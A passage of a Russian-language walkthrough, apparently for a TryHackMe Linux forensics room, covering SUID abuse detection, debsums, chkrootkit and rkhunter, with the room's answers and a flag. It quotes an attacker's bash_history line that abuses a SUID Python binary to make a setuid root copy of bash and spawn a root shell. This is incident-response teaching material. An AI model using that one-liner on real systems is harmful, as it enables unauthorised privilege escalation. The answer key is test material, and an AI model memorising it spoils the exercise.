Какой скрытый флаг находится в домашнем каталоге Боба?

```commandline
THM{6ed90e00e4fb7945bead8cd59e9fcd7f}
```
Запустите stat команду на файле Джейн authorized_keys. Какова полная временная метка последней модификации?

```commandline
2024-02-13 00:34:16.005897449 +0000
```

## Задание 6
Еще одна область, на которую следует обратить внимание в файловой системе нашего скомпрометированного хоста, — это 
выявление двоичных и исполняемых файлов, которые злоумышленник мог создать, изменить или использовать с помощью 
неправильных конфигураций разрешений.  

### Выявление подозрительных двоичных файлов

find В системах на базе UNIX мы можем использовать команду для быстрого обнаружения всех исполняемых файлов в 
файловой системе:

Список всех исполняемых двоичных файлов в системе
```commandline
investigator@MACHINE_IP:~$ find / -type f -executable 2> /dev/null
/snap/core/16574/etc/init.d/single
/snap/core/16574/etc/init.d/ssh
/snap/core/16574/etc/init.d/ubuntu-fan
/snap/core/16574/etc/init.d/udev
...
```

Следующая команда рекурсивно обходит файловую систему, начиная с корневого каталога, и выводит список всех найденных 
исполняемых файлов. Обратите внимание, что это обеспечивает огромный объем вывода. Поэтому часто бывает полезно 
ограничить область поиска с помощью дополнительных параметров.  

После того как мы идентифицируем исполняемый или двоичный файл, который хотим исследовать подробнее, мы можем 
выполнить анализ метаданных, как мы делали ранее, выполняя проверку его целостности с использованием контрольных 
сумм или проверяя его понятные человеку строки и необработанное содержимое.  

### Струны

Команда strings полезна для извлечения читаемых человеком строк из двоичных файлов. Эти строки иногда могут включать 
имена функций, имена переменных и даже простые текстовые сообщения, встроенные в двоичный файл. Анализ этой 
информации может помочь спасателям определить, для чего используется двоичный файл и есть ли какая-либо 
потенциальная вредоносная активность. Чтобы запустить команду strings для файла, нам нужно предоставить файл в 
качестве одного аргумента:   

Пример строк
```commandline
user@tryhackme$ strings example.elf
```

### debsums

Как и проверка целостности, которую мы выполняли ранее, debsums представляет собой утилиту командной строки для 
систем Linux на базе Debian , которая проверяет целостность установленных файлов пакетов. debsums автоматически 
сравнивает контрольные суммы MD5 файлов, установленных из пакетов Debian, с известными контрольными суммами, 
хранящимися в метаданных пакета. 

Если какие-либо файлы были изменены или повреждены, debsums сообщит о них, указав на потенциальные проблемы с 
целостностью пакета. Это может быть полезно для обнаружения вредоносных изменений и проблем с целостностью в пакетах 
системы. Мы можем выполнить эту проверку на скомпрометированной системе, выполнив следующую команду: 

Сканирование пакетов с помощью debsums
```commandline
investigator@MACHINE_IP:~$ sudo debsums -e -s
debsums: changed file /***/******* (from sudo package)
```

В приведенной выше команде мы предоставляем -e флаг для выполнения только проверки файла конфигурации. Кроме того, мы 
предоставляем флаг -s для отключения любого вывода ошибок, который может заполнить экран.

### Двоичные разрешения

SetUID (SUID) и SetGID (SGID) — это специальные биты разрешений в операционных системах Unix. Эти биты разрешений 
изменяют поведение исполняемых файлов, позволяя им запускаться с привилегиями владельца файла или группы, а не с 
привилегиями пользователя, который запускает файл.

Если двоичный или исполняемый файл в системе неправильно настроен с набором разрешений SUID или SGID, злоумышленник 
может злоупотребить двоичным файлом, чтобы выйти из ограниченной (непривилегированной) оболочки посредством 
законного, но непреднамеренного использования этого двоичного файла. Например, если двоичный файл PHP содержал бит 
SUID для запуска от имени root, злоумышленнику будет легко злоупотребить им для запуска системных команд через 
системные функции PHP exec от имени root.

Идентификация двоичных файлов SetUID (SUID) в системе Linux включает проверку прав доступа к файлам и явный поиск 
исполняемых файлов с установленным битом SetUID. Мы можем вернуться к findкоманде для получения списка двоичных 
файлов SetUID в системе:  

Список двоичных файлов SUID с помощью find
```commandline
investigator@MACHINE_IP:~$ find / -perm -u=s -type f 2>/dev/null
...
/usr/bin/fusermount
/usr/bin/python3.8
/usr/bin/at
/usr/bin/mount
/var/tmp/bash
/mnt/usb/lib/dbus-1.0/dbus-daemon-launch-helper
...
```
В частности, приведенная выше команда ищет файлы, в которых для разрешения пользователя установлен бит SUID ( -u=s).

Большая часть вывода здесь ожидаема, так как эти двоичные файлы требуют бит SUID и не уязвимы. Однако два из этих 
результатов выделяются. Во-первых, Python никогда не следует давать разрешение SUID, так как повысить привилегии до 
владельца несложно. Кроме того, любые двоичные файлы SUID в каталоге /tmpили /var/tmpвыделяются, так как эти 
каталоги обычно доступны для записи всем пользователям, и несанкционированное создание двоичных файлов SUID в этих 
каталогах представляет значительный риск.

Мы можем провести дальнейшее исследование, просмотрев историю bash Джейн на предмет команд, связанных с Python или bash:

Корреляция злоупотреблений SUID в bash_history
```commandline
investigator@MACHINE_IP:~$ sudo cat /home/jane/.bash_history | grep -B 2 -A 2 "python"
ls -al
find / -perm -u=s -type f 2>/dev/null
/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p", "-c", "cp /bin/bash /var/tmp/bash && chown root:root /var/tmp/bash && chmod +s /var/tmp/bash")'
ls -al /var/tmp
/var/tmp/bash -p
exit
```

Из выходных данных мы обнаружили доказательства того, что учетная запись пользователя Джейн идентифицировала 
двоичные файлы SUID с помощью команды findи злоупотребляла разрешением SUID на двоичный файл Python для запуска 
системных команд от имени пользователя root. С помощью этого уровня выполнения команд злоумышленник смог создать 
копию двоичного файла /bin/bash(исполняемый файл оболочки Bash) и поместить ее в /var/tmpпапку. Кроме того, 
злоумышленник изменил владельца этого файла на root и добавил к нему разрешение SUID ( chmod +s).

После создания копии SUID /bin/bash злоумышленник повысил свои права до root, запустив /var/tmp/bash -p. Мы можем 
дополнительно проверить bash двоичный файл, выполнив проверку целостности оригинала:

Проверка целостности подозрительного двоичного файла SUID
```commandline
investigator@MACHINE_IP:~$ md5sum /var/tmp/bash 
7063c393************d3b340f1ad2c  /var/tmp/bash
investigator@MACHINE_IP:~$ md5sum /bin/bash
7063c393************d3b340f1ad2c  /bin/bash
```
Вышеприведенный вывод показывает, что два двоичных файла идентичны, что еще больше расширяет наше понимание действий 
злоумышленника по повышению уровня до уровня root. 

### Ответить на вопросы ниже
Запустите debsums утилиту на скомпрометированном хосте, чтобы проверить только файлы конфигурации. Какой файл 
вернулся как измененный? 

```commandline
/etc/sudoers
```

Каков md5sum двоичный файл, созданный злоумышленником для повышения привилегий до root?
```commandline
7063c3930affe123baecd3b340f1ad2c
```
## Задание 7
Руткит — это тип вредоносного набора инструментов или программного обеспечения, предназначенного для получения 
контроля над системой на уровне администратора, оставаясь незамеченным системой или пользователем. Термин «руткит» 
происходит от «root», пользователя самого высокого уровня в системах на базе Unix, и «kit», который обычно относится 
к набору инструментов, используемых для поддержания этого доступа.

Руткиты особенно опасны, поскольку они могут скрывать свое присутствие в системе и позволять злоумышленникам 
поддерживать долгосрочный доступ без обнаружения. Злоумышленники также могут использовать их для организации других 
вредоносных действий на цели, извлечения конфиденциальной информации или удаленного управления и контроля 
скомпрометированной системы.   

К счастью, мы можем использовать некоторые автоматизированные инструменты в системах на базе UNIX для обнаружения и 
удаления руткитов. 

### Chkrootkit

Chkrootkit (Check Rootkit) — популярная утилита на базе Unix, используемая для проверки файловой системы на наличие 
руткитов. Она работает как простой скрипт оболочки, используя распространенные двоичные файлы Linuxgrep , такие как 
и stringsдля сканирования основных системных программ для идентификации сигнатур. Она может использовать сигнатуры 
из файлов, каталогов и процессов для сравнения данных и выявления общих шаблонов известных руткитов. Поскольку она 
не выполняет глубокий анализ, она является отличным инструментом для первой проверки с целью выявления потенциальной 
компрометации, но она может не обнаружить все типы руткитов.     

Кроме того, современные руткиты могут намеренно пытаться идентифицировать и атаковать копии программы chkrootkit или 
применять другие стратегии, чтобы избежать ее обнаружения. 

Мы можем получить доступ к chkrootkit на скомпрометированной системе, используя наши смонтированные двоичные файлы. 
Мы можем выполнить простую проверку, запустив chkrootkit: 

Пример Chkrootkit
```commandline
investigator@MACHINE_IP:~$ sudo chkrootkit
ROOTDIR is `/'
Checking `amd'...                                           not found
Checking `basename'...                                      not infected
Checking `biff'...                                          not found
Checking `chfn'...                                          not infected
Checking `chsh'...                                          not infected
Checking `cron'...                                          not infected
Checking `crontab'...                                       not infected
Checking `date'...                                          not infected
...
```

Это сканирование даст большой объем выходных данных, но оно отображает результаты различных проверок на наличие 
известных файлов или шаблонов, связанных с руткитами. 

### RKHunter

RKHunter (Rootkit Hunter) — еще один полезный инструмент, предназначенный для обнаружения и удаления руткитов в 
операционных системах типа Unix. Он предлагает более полную и многофункциональную проверку обнаружения руткитов по 
сравнению с chkrootkit . RKHunter может сравнивать хэши SHA-1 основных системных файлов с известными хорошими 
файлами в своей базе данных для поиска распространенных расположений руткитов, неправильных разрешений, скрытых 
файлов и подозрительных строк в модулях ядра. Это отличный выбор для более полной оценки затронутой системы.

Поскольку rkhunter использует живую базу данных известных сигнатур руткитов, проверка обновлений базы данных 
(rkhunter --update) перед запуском в полевых условиях имеет решающее значение. Поскольку эта система изолирована, мы 
не сможем запустить обновление базы данных здесь, но последняя версия была получена до монтирования наших 
инструментов в систему.   

Чтобы выполнить простое сканирование с помощью rkhunter , мы можем выполнить следующую команду:

Пример Rkhunter
```commandline
investigator@MACHINE_IP:~$ sudo rkhunter -c -sk
[ Rootkit Hunter version 1.4.6 ]

Checking system commands...

  Performing 'strings' command checks
    Checking 'strings' command                               [ OK ]

  Performing 'shared libraries' checks
    Checking for preloading variables                        [ None found ]
...
```

Эта проверка займет некоторое время, но мы обошли запросы на взаимодействие с пользователем с помощью аргумента -sk. 
После этого вы получите сводку проверки системы с подробным описанием того, что было найдено.

### Ответить на вопросы ниже
Запустите chkrootkit на затронутой системе. Каков полный путь к файлу, .sh который был обнаружен?

```commandline
/var/tmp/findme.sh
```
Запустите rkhunter на затронутой системе. Каков результат проверки (UID 0) accounts?

```commandline
Warning
```

## Задание 8
Поздравляем! Вы добрались до конца этого исследования судебной экспертизы файловой системы Linux . Наше 
расследование охватывало несколько тем, включая изучение цифровых артефактов, системных журналов, пользователей и 
структур файлов. Помните, что анализ и идентификация скомпрометированных системных артефактов представляют собой 
лишь одну фазу процесса реагирования на инциденты — следующие комнаты в модуле расширяют другие, не менее важные 
области для проведения оперативной криминалистики в системах на базе Unix в полевых условиях.

Кроме того, если вам понравилось изучать методологии выявления уязвимостей систем и вы хотите больше узнать об 
усилении защиты этих систем, посетите комнату Bulletproof Penguin ! Чтобы проверить свои навыки в выявлении 
механизмов сохранения на машинах Linux, обязательно попробуйте выполнить задание Tardigrade!

### Ответить на вопросы ниже
Нажмите и продолжайте обучение!
```commandline
Ответ не нужен
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)